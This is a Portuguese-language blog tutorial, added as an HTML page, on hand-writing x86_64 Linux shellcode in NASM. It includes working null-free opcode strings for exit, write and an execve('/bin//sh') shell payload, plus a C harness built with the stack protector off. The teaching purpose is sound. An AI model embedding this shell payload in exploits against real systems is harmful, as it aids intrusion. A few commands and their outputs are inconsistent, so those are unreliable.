@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <title>n3k00n3| Labs</title>
+  <meta name="viewport" content="width=device-width">
+  <!--[if lt IE 9]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+  <link href="../../files/style.css" rel="stylesheet">
+  <link href="../../files/colors-dark.css" rel="stylesheet">
+</head>
+<body>
+
+  <header id="header">
+    <a href="index.html"><img alt="Emma | Labs" src="../../files/logo.png"></a>
+  </header>
+
+  <div id="page">
+    <div id="sidebar">
+      <nav>
+        <ul>
+          <li><a href="../../index.html">Home</a></li>
+          <li><a href="../../blog.html">Blog</a></li>
+		  <li><a href="../../links.html">Links</a></li>
+          <li><a href="../../about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  <div id="content">
+    <div id="blog-archives">
+	    <h1><strong>Shellcodes</strong></h1>
+      <h3>Construindo shellcode em asm 64</h3>
+
+      <p> Todo mundo ama shellcode, acho que isso é um fato. Eu também curto pra caramba, então resolvi aprender de verdade e parar de ficar catando shellcodes por esse mundão chamado internet.</p>
+
+      <p>O primeiro local que eu vi falando sobre shellcode foi em uma zine chamada Congumelo Binário. Vou deixar o link do artigo nas referências desse post.</p> O artigo foi escrito pelo Victor Ramos Mello aka <a href="https://github.com/m0nad" target="_blank">m0nad</a>
+
+      <p>Achei maneiro pra caramba, mas ele fala apenas sobre x86, então após aprender com esse paper, resolvi explicar em 64, já que vivemos em um mundo movido a 64bits. A primeira diferença é a ordem em que devem ser passados os paramêtros, mas vamos ver isso mais pra frente. O M0nad também usa a syntax AT&T, e como eu aprendi asm usando a syntax intel, vou usar ela aqui, só por questão de gosto mesmo(leia-se preguiça).</p>
+
+    <h3>O que são Shellcodes?</h3>
+    <p> Shellcodes são pedaços de código usados como payload para exploração de vunerabilidades em softwares, geralmente em falhas de buffer overflow. Então quem já brincou com exploits, já deve ter visto bastante. Shellcodes tem esse nome, porque na maioria dos casos tem o objetivo de pegar uma shell.<br>Os shellcodes são escritos com os valores hexadecimais dos opcodes da arquitetura alvo, por isso deve se ter o conhecimento de assembly e sistemas operacionais.</p>
+
+    <h3>Quais as ferramentas serão usadas?</h3>
+    <p>Como vou usar a syntax Intel então vou usar o montador Nasm<br>
+    <strong>ld</strong> para linkar<br>
+    <strong>gcc</strong> para compilar nosso código em C<br>
+    <strong>objdump</strong> para visualizar o arquivo objeto<br>
+    <strong>ruby</strong> para fazer reverse de string(em hex)<br>
+    <strong>Linux 64 bits</strong> como ambiente e Sistema Operacional alvo</p>
+
+    <pre><code><blockquote>
+n3k00n3@labs:~$ uname -a
+Linux labs 4.9.14-200.fc25.x86_64 #1 SMP Mon Mar 13 19:26:40 UTC 2017   x86_64 x86_64 x86_64 GNU/Linux
+
+n3k00n3@labs:~$ nasm -v 
+NASM version 2.12.02 compiled on Jul 14 2016
+
+n3k00n3@labs:~$ ld -v
+GNU ld version 2.26.1-1.fc25
+
+n3k00n3@labs:~$ ruby -v
+ruby 2.3.3p222 (2016-11-21 revision 56859) [x86_64-linux]
+
+n3k00n3@labs:~$ gcc -v
+gcc version 6.3.1 20161221 (Red Hat 6.3.1-1) (GCC)
+    </blockquote></code></pre>
+
+    <h3>System Calls Linux</h3>
+    <p>Chamadas de sistemas é a interface entre aplicação e o kernel.<br>
+    Pode-se ver aqui:</p>
+
+    <pre><code><blockquote>
+n3k00n3@labs:~$ cat /usr/include/asm/unistd_64.h 
+    </blockquote></code></pre>
+
+    <p>Você também pode ver para 32 bits em unistd_32.h</p>
+
+    <h3>exit(0)</h3>
+    <p>Vamos iniciar com um exemplo simples da chamada exit(0)</p>
+    <p> Primeiro vamos pegar o número dessa syscall dando um grep para não ter que ler todo o arquivo.</p>
+    <blockquote><code><pre>
+n3k00n3@labs:~$  grep exit /usr/include/asm/unistd_64.h 
+#define __NR_exit 60
+#define __NR_exit_group 231
+    </blockquote></code></pre>
+
+    <p>Agora que sabemos que é 60 vamos construir nosso shellcode, passando os argumentos para os registradores de própositos gerais que na arquitetura de 64 bits é RAX(valor syscall), RDI, RSI, RDX, R10, R8, R9.</p>
+
+    <pre><code><blockquote>
+global _start
+
+section .text
+_start:
+    mov rax, 60
+    mov rdi, 0x0
+    syscall
+    </blockquote></code></pre>
+    <p>Certo, agora vamos compilar nosso código.</p>
+
+    <pre><code><blockquote>
+n3k00n3@labs:~$ nasm -felf64 asm_exit_linux64.asm -o shellcode.o
+    </blockquote></code></pre>
+
+    <p>Repare que eu passei o nome do arquivo de saída como shellcode.o se tu não passar, ele será salvo com o mesmo nome do arquivo .asm porém com o .o <br>
+    Agora vamos linkar nosso arquivo objeto.</p>
+    <pre><code><blockquote>
+n3k00n3@labs:~$ ld shellcode.o shellcode
+    </blockquote></code></pre>
+
+    <p>Agora que já montamos e linkamos, resta execurtamos para ver se está ok nosso programinha em assembly</p>
+    <pre><code><blockquote>
+n3k00n3@labs:~$ ./shellcode
+</blockquote></code></pre>
+
+    <p>Vocês devem ter reparado que não aconteceu absolutamente nada, pelo menos não foi possível ver. Mas não existe nenhum output no nosso programa, então de certa forma já era experado, vamos usar o strace para ver se nosso exit foi executado mesmo.</p>
+
+     <pre><code><blockquote>
+n3k00n3@labs:~$ strace ./shellcode
+execve("./shellcode", ["./shellcode"], [/* 57 vars */]) = 0
+exit(0)                                 = ?
++++ exited with 0 +++
+    </pre></code></blockquote>    
+
+    <p>Great! nosso código rodou, a syscall exit(0) foi executada, hora de olhar e pegar os opcodes com objdump e depois testar nosso shellcode.</p>
+
+    <pre><code><blockquote>
+n3k00n3@labs:~$ objdump -M intel -D shellcode.o 
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:	b8 3c 00 00 00       	mov    eax,0x3c
+   5:	bf 00 00 00 00       	mov    edi,0x0
+   a:	0f 05                	syscall
+    </pre></code></blockquote>
+
+    <p> onde tem b8, 3c, 00, 00, 00... Esse são os opcodes do nosso código, vamos agora pegar eles de um forma melhor, pois agora temos poucos mas em breve teremos muitos, e fazer isso um por um não é tão elegante nem criativo.</p>
+
+    <pre><code><blockquote>
+n3k00n3@labs:~$ for i in $(objdump -D shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05
+    </pre></code></blockquote>
+
+    <p>Agora só pegar os opcodes e colar no nosso código de teste.</p>
+    <pre><code><blockquote>
+#include &#60;stdio.h&#62;
+#include &#60;string.h&#62;
+
+unsigned char code[] = \
+"\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05";
+
+int main()
+{
+
+	printf("Shellcode Length:  %d\n", (int)strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+</pre></code></blockquote>
+    <p>Rodando e verificando com strace</p>
+
+<pre><code><blockquote>
+
+n3k00n3@labs:~$ gcc -fno-stack-protector -z execstack testing.c -o testing
+
+n3k00n3@labs:~$ ./testing
+Shellcode Length:  2
+
+n3k00n3@labs:~$strace ./testing
+execve("./testing", ["./testing"], [/* 57 vars */]) = 0
+brk(NULL)                               = 0x1eef000
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fbf531bb000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=96774, ...}) = 0
+mmap(NULL, 96774, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fbf531a3000
+close(3)                                = 0
+open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0 \5\2\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=2115824, ...}) = 0
+mmap(NULL, 3955040, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fbf52bd2000
+mprotect(0x7fbf52d8f000, 2093056, PROT_NONE) = 0
+mmap(0x7fbf52f8e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bc000) = 0x7fbf52f8e000
+mmap(0x7fbf52f94000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fbf52f94000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fbf531a1000
+arch_prctl(ARCH_SET_FS, 0x7fbf531a1700) = 0
+mprotect(0x7fbf52f8e000, 16384, PROT_READ) = 0
+mprotect(0x600000, 4096, PROT_READ)     = 0
+mprotect(0x7fbf531bd000, 4096, PROT_READ) = 0
+munmap(0x7fbf531a3000, 96774)           = 0
+fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+brk(NULL)                               = 0x1eef000
+brk(0x1f10000)                          = 0x1f10000
+brk(NULL)                               = 0x1f10000
+write(1, "Shellcode Length:  2\n", 21Shellcode Length:  2
+)  = 21
+exit(0)                                 = ?
++++ exited with 0 +++
+</blockquote></code></pre>
+
+<p>Massa, nosso código funcionou bacana! Aprendemos como eles basicamente funcionam, vamos agora melhorar nosso código, que, como podemos ver tem muitos bytes nullos, também conhecidos NULLBYTES e eles costumam atrapalhar nossos exploits. Vamos refazer o código sem gerar esse nullbytes. Percebam que para saber como não gerar esses bytes nulos, você precisa conhecer bem de assembly, quais instruções geram menos opcodes também, pois quanto menor, melhor.<p>
+<pre><code><blockquote>
+global _start
+
+section .text
+_start:
+    xor rax, rax
+    mov al, 60
+    xor rdi, rdi
+    syscall
+</blockquote></code></pre>
+<p>Compilando e lendo opcodes...
+
+<pre><code><blockquote>
+n3k00n3@labs:~$ nasm -felf64 asm_nbf_exit_linux64.asm -o shellcode.o
+
+n3k00n3@labs:~$ objdump -M intel -D shellcode.o 
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:	48 31 c0             	xor    rax,rax
+   3:	b0 3c                	mov    al,0x3c
+   5:	48 31 ff             	xor    rdi,rdi
+   8:	0f 05                	syscall 
+
+</blockquote></code></pre>
+
+<p>Agora que removemos os nullbytes, vamos pegar só os opcodes e testa-los novamente...</p>
+
+<pre><code><blockquote>
+n3k00n3@labs:~$ nasm -felf64 asm_nbf_exit_linux64.asm -o shellcode.o
+
+n3k00n3@labs:~$ objdump -M intel -D shellcode.o 
+
+shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0:	48 31 c0             	xor    rax,rax
+   3:	b0 3c                	mov    al,0x3c
+   5:	48 31 ff             	xor    rdi,rdi
+   8:	0f 05                	syscall 
+n3k00n3@labs:~$ for i in $(objdump -D shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05
+
+n3k00n3@labs:~$ vim testing.c 
+
+n3k00n3@labs:~$ gcc -fno-stack-protector -z execstack testing.c -o testing
+
+n3k00n3@labs:~$ ./testing 
+Shellcode Length:  10
+
+n3k00n3@labs:~$ strace ./testing
+execve("./testing", ["./testing"], [/* 57 vars */]) = 0
+brk(NULL)                               = 0x180e000
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f9c26226000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=96774, ...}) = 0
+mmap(NULL, 96774, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f9c2620e000
+close(3)                                = 0
+open("/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0 \5\2\0\0\0\0\0"..., 832) = 832
+fstat(3, {st_mode=S_IFREG|0755, st_size=2115824, ...}) = 0
+mmap(NULL, 3955040, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f9c25c3d000
+mprotect(0x7f9c25dfa000, 2093056, PROT_NONE) = 0
+mmap(0x7f9c25ff9000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bc000) = 0x7f9c25ff9000
+mmap(0x7f9c25fff000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f9c25fff000
+close(3)                                = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f9c2620c000
+arch_prctl(ARCH_SET_FS, 0x7f9c2620c700) = 0
+mprotect(0x7f9c25ff9000, 16384, PROT_READ) = 0
+mprotect(0x600000, 4096, PROT_READ)     = 0
+mprotect(0x7f9c26228000, 4096, PROT_READ) = 0
+munmap(0x7f9c2620e000, 96774)           = 0
+fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+brk(NULL)                               = 0x180e000
+brk(0x182f000)                          = 0x182f000
+brk(NULL)                               = 0x182f000
+write(1, "Shellcode Length:  10\n", 22Shellcode Length:  10
+) = 22
+exit(0)                                 = ?
++++ exited with 0 +++
+
+</blockquote></code></pre>
+
+<p>Great Work!</p>
+
+<h3>Que tal um output simples?</h3>
+<p>Agora temos um noção muito melhor de como construir shellcodes, vamos construir um novo sem nullbytes de um código que apenas vai mostrar "Hello world" na tela e sair. vamos usar a técnica que passa nossa string para a stack e depois para o registrador correto. Existem mais técnicas que podem ser usadas, procurem por elas, aprenda e escreva bastante, pois só assim, esse conhecimento será fixado de maneira que tu não esqueça daqui a uma semana.</p>
+
+<p> Primeiro temos que pegar os cada letra em hexadecimal e na ordem reversa, já que estamos trabalhando com arquitetura x86_64 e ela é Little Endian. Vamos aproveitar também e pegar o tamanho da nossa string(Consulte a tabela ascii com: man ascii). Também precisamos saber qual a syscall que escreve na tela.</p>
+<pre><code><blockquote>
+n3k00n3@labs:~$ ruby -e '"Hello word\n".reverse.each_byte {|x| print x.to_s(16)}'
+a64726f77206f6c6c6548
+
+n3k00n3@labs:~$ ruby -e 'print "Hello world\n".length'
+12
+
+n3k00n3@labs:~$ grep write /usr/include/asm/unistd_64.h 
+#define __NR_write 1
+
+</blockquote></code></pre>
+
+<p>Nosso código do helloword!</p>
+
+<blockquote><code><pre>
+section .text
+global _start
+
+    _start:
+        xor rax, rax
+        inc rax
+        mov rdi, rax
+        push 0x0a646c72
+        mov rbx, 0x6f57206f6c6c6548
+        push rbx
+        mov rsi, rsp
+        mov rdx, rdi
+        add rdx, 0xb
+        syscall
+
+        xor rax, rax
+        add rax, 60
+        xor rdi, rdi
+        syscall
+</pre></code></blockquote>
+
+<p>Montando e linkando, testando...</p>
+
+<blockquote><code><pre>
+n3k00n3@labs:~$ nasm asm_helloword.asm -o shellcode.o
+n3k00n3@labs:~$ !ld
+n3k00n3@labs:~$ ./shellcode
+</pre></code></blockquote>
+
+<p>Funcionou! Vamos pegar os opcodes e testar nosso shellcode.</p>
+
+<blockquote><code><pre>
+n3k00n3@labs:~$ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x68\x72\x6c\x64\x0a\x48\xbb\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x53\x48\x89\xe6\x48\x89\xfa\x48\x83\xc2\x0b\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05
+</pre></code></blockquote>
+
+<p>Não vou colar aqui novamente o codigo de teste, mas já vimos como fazer, então é só fazer.</p>
+
+<blockquote><code><pre>
+n3k00n3@labs:~$ ./testing
+Shellcode Length:  49
+Hello World
+</pre></code></blockquote>
+
+<p>Great work!</p>
+
+<h3>Hora de fazer jus ao nome SHELLCODE</h3>
+<p>Chegada a hora de obtermos uma shell, dessa vez vamos usar a syscall execve(), porém a string dessa vez será '/bin/bash', só que vamos usar uma '/' a mais para evitar bytes nulos. Ficando assim '/bin//sh'. Vamos ao código.</p>
+<blockquote><code><pre>
+;-------------------------------
+; Execve Using Stack technique
+;-------------------------------
+
+global _start
+
+section .text
+    _start:
+        xor rax, rax
+        push rax
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+        mov rdi, rsp
+
+        push rax
+        mov rdx, rsp
+
+        push rdi
+        mov rsi, rsp
+        add rax, 59
+        syscall
+
+</pre></code></blockquote>
+
+<p>Montando, linkando, testando...</p>
+<blockquote><code><pre>
+n3k00n3@labs:~$ nasm -felf64 asm_nbf_execve_sh_linux64.asm -o shellcode.o
+n3k00n3@labs:~$ ld shellcode.o -o shellcode
+n3k00n3@labs:~$ ./shellcode
+sh-4.3$
+</pre></code></blockquote>
+
+<p>Muito bem, funcionou agora vamos catar só os opcodes e testa-lo novamente.</p>
+ <blockquote><code><pre>
+ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
+
+ </pre></code></blockquote>
+
+<blockquote><code><pre>
+n3k00n3@labs:~$ ./testing
+Shellcode Length:  32
+sh-4.3$
+</pre></code></blockquote>
+
+    <h3>Referências</h3>
+    <ul>
+    <li><a href="http://phrack.org/issues/49/14.html#article" target="_blank">Smashing the stack for fun and profit</a></li>
+    <li><a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441" target="_blank">The art of exploitation - Jon Erickson</a></li>
+    <li><a href="https://raw.githubusercontent.com/m0nad/Papers/master/ConstruindoShellcodes.txt" target="_blank">Construindo Shellcodes 32bits</a></li>
+    <li><a href="https://www.amazon.com.br/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X/ref=sr_1_sc_1?ie=UTF8&qid=1491405252&sr=8-1-spell&keywords=shellcodes" target="_blank">Shellcoders Handbook </a></li>
+    </ul>
+
+<br><br>
+      <strong>Done! Happy code!</strong>
+    </div>
+  </div>
+  </div>
+  <footer id="footer">
+    <p class="copyright">Hack The Planet!</p>
+    <!-- Thanks to <a href="http://www.webmaster-source.com">Matt Harzewski</a> for the theme!!!</p> -->
+  </footer>
+  <script src="../../files/jquery.min.js"></script>
+  <script src="../../files/jquery.mobilemenu.min.js"></script>
+  <script>
+    $(document).ready(function(){
+      $('#sidebar nav ul').mobileMenu({'topOptionText': 'Menu', 'prependTo': '#sidebar nav'});
+    });
+  </script>
+</body></html>
